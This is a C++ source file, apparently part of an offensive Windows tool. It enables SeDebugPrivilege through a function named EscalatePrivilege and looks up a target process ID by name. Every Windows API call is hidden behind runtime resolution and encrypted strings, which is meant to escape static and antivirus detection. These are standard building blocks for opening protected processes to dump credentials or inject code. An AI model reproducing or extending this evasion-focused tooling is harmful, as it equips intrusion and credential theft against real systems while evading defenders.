#include <windows.h>
#include <iostream>
#include "utils.h"
#include "winapi_obfuscation.h"
#include "winapi_function_signatures.h"
#include "string_encryption.h"

bool SetPrivilege(
	HANDLE hToken,          // Access token handle
	LPCTSTR lpszPrivilege,  // Name of the privilege to enable/disable
	BOOL bEnablePrivilege   // TRUE to enable, FALSE to disable
) {
	TOKEN_PRIVILEGES tp;
	LUID luid;

	// Retrieve the LUID for the specified privilege
	if (!resolve_dynamically<LookupPrivilegeValueA_t>(str_LookupPrivilegeValueA, str_advapi32)(
		NULL,            // Lookup privilege on the local system
		lpszPrivilege,   // Privilege to lookup
		&luid))			 // Receives the LUID of the privilege
	{
#ifdef _DEBUG
		std::cerr << "LookupPrivilegeValue error: " << resolve_dynamically<GetLastError_t>(str_GetLastError)() << std::endl;
#endif // _DEBUG
		return false;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

	// Enable or disable the privilege in the access token
	if (!resolve_dynamically<AdjustTokenPrivileges_t>(str_AdjustTokenPrivileges, str_advapi32)(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		NULL,
		NULL))
	{
#ifdef _DEBUG
		std::cerr << "AdjustTokenPrivileges error: " << resolve_dynamically<GetLastError_t>(str_GetLastError)() << std::endl;
#endif // _DEBUG
		return false;
	}

	// Check for any errors that may have occurred during the adjustment
	if (resolve_dynamically<GetLastError_t>(str_GetLastError)() == ERROR_NOT_ALL_ASSIGNED) {
#ifdef _DEBUG
		std::cerr << "The token does not have the specified privilege." << std::endl;
#endif // _DEBUG
		return false;
	}

	return true;
}

// Enable the SeDebugPrivilege in the access token of the process
int EscalatePrivilege()
{
	HANDLE hToken;

	auto OpenProcessTokenFunc = resolve_dynamically<OpenProcessToken_t>(str_OpenProcessToken, str_advapi32);
	auto GetCurrentProcessFunc = resolve_dynamically<GetCurrentProcess_t>(str_GetCurrentProcess);

	// Open the access token associated with the current process
	if (!OpenProcessTokenFunc(GetCurrentProcessFunc(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
#ifdef _DEBUG
		std::cerr << "OpenProcessToken error: " << resolve_dynamically<GetLastError_t>(str_GetLastError)() << std::endl;
#endif // _DEBUG
		return -1;
	}

	// Attempt to enable SeDebugPrivilege
		if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
		{
#ifdef _DEBUG
			std::cerr << "Failed to enable SeDebugPrivilege." << std::endl;
#endif // _DEBUG
			return -1;
		}


	resolve_dynamically<CloseHandle_t>(str_CloseHandle)(hToken);
	return 0;
}


DWORD GetProcessIdByName(const char* procName)
{
	typedef decltype(CreateToolhelp32Snapshot)* CreateToolhelp32Snapshot_t;
	typedef decltype(Process32First)* Process32First_t;
	typedef decltype(Process32Next)* Process32Next_t;

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = resolve_dynamically<CreateToolhelp32Snapshot_t>(str_CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);

	if (resolve_dynamically<Process32First_t>(str_Process32First)(snapshot, &entry) == TRUE)
	{
		while (resolve_dynamically<Process32Next_t>(str_Process32Next)(snapshot, &entry) == TRUE)
		{
			if (_stricmp(entry.szExeFile, procName) == 0)
			{
				resolve_dynamically<CloseHandle_t>(str_CloseHandle)(snapshot);
				return entry.th32ProcessID;
			}
		}
	}

	return 0;
}